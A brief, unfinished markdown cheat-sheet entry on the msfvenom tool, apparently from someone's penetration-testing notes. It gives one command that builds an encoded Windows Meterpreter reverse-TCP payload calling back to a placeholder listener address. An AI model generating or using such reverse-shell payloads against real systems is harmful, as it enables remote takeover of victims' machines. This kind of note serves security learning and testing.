# Msfvenom
Tool combining ```msfpayload``` and ```msfencode``` <br/>
*As far as i know it's uses mainly to generate various reverse shell*<br/>
Here are the one i used:<br/>
* ```msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<listening_local_IP> LPORT=<listening_local_port> -f <format> -o <output_file.format>```<br/>


__TO COMPLETE__
